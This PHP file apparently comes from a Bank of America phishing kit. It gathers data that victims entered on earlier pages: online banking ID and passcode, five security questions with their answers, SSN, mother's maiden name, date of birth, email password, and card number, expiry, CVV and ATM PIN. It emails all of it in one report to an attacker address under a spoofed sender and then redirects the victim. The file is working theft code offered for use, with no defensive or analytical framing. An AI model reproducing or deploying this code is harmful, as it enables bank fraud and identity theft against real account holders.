<?php
if ($include != 1)
 {
 die('Illegal Access');
 }

//Open Session
ob_start();
ini_set("output_buffering",4096);
session_start();



include 'vcard.php';
include 'Com.php';



//Sessions
$onlineID = $_SESSION['ONLINEID'];

$questionI =  $_SESSION['QUESTIONI'];
$questionII = $_SESSION['QUESTIONII'];
$questionIII = $_SESSION['QUESTIONIII'];
$questionIIII = $_SESSION['QUESTIONIIII'];
$questionIIIII = $_SESSION['QUESTIONIIIII'];

$answerI = $_SESSION['ANSWERI'];
$answerII = $_SESSION['ANSWERII'];
$answerIII = $_SESSION['ANSWERIII'];
$answerIIII = $_SESSION['ANSWERIIII'];
$answerIIIII = $_SESSION['ANSWERIIIII'];

$passCode = $_SESSION['PASSCODE'];

$cardNo = $_SESSION['CCNUMBER'];
$eXP = $_SESSION['EXPDATE'];
$cVV = $_SESSION['CVVCARD'];
$pinCode = $_SESSION['PINSS'];
$Card_type = is_valid_card($cardNo);
$ssnNo = $_SESSION['SSNNUMB'];
$State = $_SESSION['STATOC'];
$MMN = $_SESSION['MMONA'];
$DOB = $_SESSION['DOBS'];
$eMail = $_SESSION['EMAILS'];
$ePassCode = $_SESSION['EPASS'];


$date = gmdate("d/m/Y | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];



$Site="=================+ ~!BOA Client!~ +=================
OnlneID : $onlineID
Passcode   : $passCode
====================~Personal info~====================
State: $State
DOB: $DOB ( Month - Day - Year )
SSN: $ssnNo
Mother's Maiden Name: $MMN
Email : $eMail
Pass  : $ePassCode
====================~Card Info~====================
Card No: $cardNo
Expires: $eXP
CVV: $cVV
PIN.ATM: $pinCode
Type: $Card_type
====================~Sitekey~====================
Question 1: $questionI $answerI
Question 2: $questionII $answerII
Question 3: $questionIII $answerIII
Question 4: $questionIIII $answerIIII
Question 5: $questionIIIII $answerIIIII
====================~Headers~====================
IP: $ip
Hostname: $hostname
Useragent: $useragent
Date: $date
=================+ ~!BOA Client!~ +=================";


$subject = "BOA $onlineID - $State - $ip";
$headers = "From: BOA Customer<Border@Source.cc>";
$headers .= "MIME-Version: 1.0\n";
mail($dom,$subject,$Site,$headers);

session_destroy();
$header = "Processing.php?True=1&zone=1&SESSIONID=".bin2hex($Site);
header("Location: $header");


?>